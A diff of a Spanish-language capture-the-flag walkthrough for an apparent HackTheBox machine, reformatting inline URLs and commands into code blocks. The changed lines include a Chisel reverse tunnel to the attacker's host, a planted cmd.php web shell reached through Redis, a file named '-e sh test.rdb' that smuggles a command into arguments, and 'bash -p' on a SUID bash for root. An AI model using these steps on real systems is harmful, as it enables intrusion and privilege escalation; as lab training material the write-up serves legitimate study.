@@ -68,7 +68,11 @@ No vemos nada.
 
 #### Analysis manual {-}
 
-Con firefox vamos a la url `http://10.10.10.94` y vemos una pagina que nos dice que el GET no esta permitido para esta pagina. Le lanzamos un curl
+Con firefox vamos a la url 
+```bash
+ http://10.10.10.94 
+```
+ y vemos una pagina que nos dice que el GET no esta permitido para esta pagina. Le lanzamos un curl
 
 ```bash
 curl -s -X GET "http://10.10.10.94:1880"
@@ -83,7 +87,11 @@ curl -s -X POST "http://10.10.10.94:1880" | jq
 }
 ```
 
-Si tratamos de ir desde firefox a la url `http://10.10.10.94/red/e6fae2bb0098d336bf34ab00a5978700` entramos en un Node-RED. 
+Si tratamos de ir desde firefox a la url 
+```bash
+ http://10.10.10.94/red/e6fae2bb0098d336bf34ab00a5978700 
+```
+ entramos en un Node-RED. 
 ## Vulnerability Assessment {-}
 
 ### Node-RED vulnerability {-}
@@ -395,8 +403,16 @@ Instalamos y configuramos **Chisel**.
     ./chisel client 10.10.14.29:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6379
     ```
 
-Desde nuestra maquina de atacante podemos con firefox connectarnos a `http://localhost` y podemos ver la web del puerto 80 de la 172.19.0.3.
-A demas podemos lanzar un `nmap -sCV -p6379 127.0.0.1`. En el codigo fuente de la pagina web vemos funcciones JS que registran las veces que
+Desde nuestra maquina de atacante podemos con firefox connectarnos a 
+```bash
+ http://localhost 
+```
+ y podemos ver la web del puerto 80 de la 172.19.0.3.
+A demas podemos lanzar un 
+```bash
+ nmap -sCV -p6379 127.0.0.1 
+```
+. En el codigo fuente de la pagina web vemos funcciones JS que registran las veces que
 cargamos la pagina y el nmap nos muestra un Redis 4.0.9.
 
 ### Redis {-}
@@ -457,7 +473,11 @@ Aqui podemos ver que hay un veinculo entre la web y la base de datos redis
     redis-cli -h 127.0.0.1 save
     ```
 
-1. con firefox vamos a la url `http://localhost/8924d0659008565c554f8128cd11fda4/cmd.php?cmd=whoami`
+1. con firefox vamos a la url 
+```bash
+ http://localhost/8924d0659008565c554f8128cd11fda4/cmd.php?cmd=whoami 
+```
+
 
 Aqui vemos que tenemos un RCE activado. Si le ponemos el comando hostname, podemos ver un nuevo segmento que seria el **172.20.0.0/24**.
 Como no tenemos connectividad de esta maquina (www) hacia nuestra maquina de atacante, tenemos que passar por la 172.19.0.4 hasta la nuestra.
@@ -588,7 +608,11 @@ La idea aqui seria crear un fichero con un nombre turbio que contiene -e.
     touch -- '-e sh test.rdb'
     ```
 
-Esperamos un poco y podemos ver que la bash es SUID y que con el comando `bash -p` nos convertimos en root y podemos leer la flag.
+Esperamos un poco y podemos ver que la bash es SUID y que con el comando 
+```bash
+ bash -p 
+```
+ nos convertimos en root y podemos leer la flag.
 Como ya podemos utilizar ping, vamos a ver que maquina es la backup.
 
 ```bash
@@ -675,7 +699,11 @@ stty -a
 stty rows <rownb> columns <colnb>
 ```
 
-mirando la maquina vemos con el comando `df -h` que hay una montura /dev/sda2 tirando a /backup.
+mirando la maquina vemos con el comando 
+```bash
+ df -h 
+```
+ que hay una montura /dev/sda2 tirando a /backup.
 Si miramos un poco los /dev/sda*
 
 ```bash
